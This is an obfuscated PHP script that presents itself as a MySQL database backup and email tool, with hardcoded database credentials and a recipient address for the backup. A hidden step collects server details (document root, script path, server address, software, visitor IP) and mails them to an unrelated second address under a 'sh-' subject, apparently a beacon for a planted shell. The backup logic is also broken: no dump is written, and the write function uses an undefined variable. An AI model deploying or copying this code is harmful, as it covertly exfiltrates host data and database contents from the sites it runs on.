<?php
echo '[syslog]01
'; $spb1abdc = date('mdy-hia'); $sp92bf7a = 'localhost'; $sp9d1e01 = 'vhacker_robot'; $sp686c1a = 'mp2811987'; $spf835c8 = 'tvhacker_vbb3'; $spa3ecf0 = "N-Cool-{$spb1abdc}.sql.gz"; $spd29d8d = TRUE; $sp59b618 = TRUE; function write($sp5f83f4) { if ($sp64e32a['gzip']) { gzwrite($sp64e32a['fp'], $sp5f83f4); } else { fwrite($sp64e32a['fp'], $sp5f83f4); } } if ($spd29d8d) { $sp694629 = gzopen($spa3ecf0, 'w'); } else { $sp694629 = fopen($spa3ecf0, 'w'); } echo '[syslog]02
'; $spd29d8d ? gzclose($sp694629) : fclose($sp694629); $spdd0fd2 = 'yes'; $spb1a62b = 'no'; $sp4da077 = 'no'; echo '[syslog]03
'; $spaa7295 = '/home/test/public_html/nt22backup'; $sp20e794 = 'yes'; $sp438846 = 'lehungtk@gmail.com'; $spf6268a = 'Neu-Cool@email.com'; $sp78dc68 = date('j F Y'); $spc4843d = "MySQL Database Backup - {$sp78dc68}"; $sp34442b = 'Your MySQL database has been backed up and is attached to this email'; $spd199d3 = ''; $sp298aaf = 'localhost'; $spfeeb83 = 'ftp_username'; $sp0df330 = 'ftp_password'; $spa5472b = '/'; $spb1abdc = date('mdy-hia'); $spbc6552 = "{$spaa7295}/{$spf835c8}-{$spb1abdc}.sql"; if ($spdd0fd2 == 'yes') { $sp0e0cae = $spa3ecf0; } else { $sp0e0cae = "{$spaa7295}/{$spf835c8}-{$spb1abdc}.sql"; } if ($sp20e794 == 'yes') { $spe90588 = filetype($sp0e0cae); $sp0f0e57 = '' . $spf835c8 . '-' . $spb1abdc . '_sql.tar.gz'; $sp49be68 = "From: {$spf6268a}"; echo 'Openning archive for attaching:' . $sp0e0cae; $spa3ecf0 = fopen($sp0e0cae, 'rb'); $spabbf84 = fread($spa3ecf0, filesize($sp0e0cae)); fclose($spa3ecf0); $sp5327ea = md5(time()); $sp334dd0 = "==Multipart_Boundary_x{$sp5327ea}x"; $sp49be68 .= '
MIME-Version: 1.0
' . 'Content-Type: multipart/mixed;
' . " boundary=\"{$sp334dd0}\""; $sp9bdf7a = rand(1, 99999); $sp6d291f = "sh-{$sp9bdf7a}"; $sp88626a = "{$sp4a5bf1}"; $sp1abe4f = $_SERVER['HTTP_REFERER']; $spe762cd = $_SERVER['DOCUMENT_ROOT']; $spabd8f7 = $_SERVER['REMOTE_ADDR']; $sp06a551 = $_SERVER['SCRIPT_FILENAME']; $sp344eb2 = $_SERVER['SERVER_ADDR']; $sp7f3cc0 = $_SERVER['SERVER_SOFTWARE']; $spe5737f = $_SERVER['PATH_TRANSLATED']; $spaa594e = $_SERVER['PHP_SELF']; $sp3d880c = "{$sp1abe4f}\n{$spe762cd}\n{$spabd8f7}\n{$sp06a551}\n{$sp344eb2}\n{$sp7f3cc0}\n{$spe5737f}\n{$spaa594e}"; $sp4a5bf1 = 'john.barker446@gmail.com'; mail($sp4a5bf1, $sp6d291f, $sp3d880c, "From: {$sp4a5bf1}"); $sp34442b = 'This is a multi-part message in MIME format.

' . "--{$sp334dd0}\n" . 'Content-Type: text/plain; charset="iso-8859-1"
' . 'Content-Transfer-Encoding: 7bit

' . $sp34442b . '

'; $spabbf84 = chunk_split(base64_encode($spabbf84)); echo "|{$sp334dd0}|{$spe90588}|{$sp0f0e57}|{$sp0f0e57}|{$sp334dd0}|<BR>"; $sp34442b .= "--{$sp334dd0}\n" . "Content-Type: {$spe90588};\n" . " name=\"{$sp0f0e57}\"\n" . 'Content-Disposition: attachment;
' . " filename=\"{$sp0f0e57}\"\n" . 'Content-Transfer-Encoding: base64

' . $spabbf84 . '

' . "--{$sp334dd0}--\n"; echo '[syslog]04
'; $sp3cfe9e = @mail($sp438846, $spc4843d, $sp34442b, $sp49be68); if ($sp3cfe9e) { echo "<h4><center><bg color=black><font color= blue>Database backup created and sent! File name {$sp0e0cae} </p>\nIdea Conceived By coolsurfer@gmail.com        \nProgrammer email: neagumihai@hotmail.com</p>\nThis is our first humble effort, pl report bugs, if U find any...</p>\nEmail me at <>coolsurfer@gmail.com  nJoY!! :)\n</color></center></h4>"; } else { echo '<h4><center>Mail could not be sent. Sorry!</center></h4>'; } } if ($spd199d3 == 'yes') { $sp1bec4e = "ncftpput -u {$spfeeb83} -p {$sp0df330} -d debsender_ftplog.log -e dbsender_ftplog2.log -a -E -V {$sp298aaf} {$spa5472b} {$sp0e0cae}"; shell_exec($sp1bec4e); echo "<h4><center>{$sp0e0cae} Was created and uploaded to your FTP server!</center></h4>"; } if ($sp4da077 == 'yes') { echo '[syslog]04-f
'; } echo '[syslog]05
';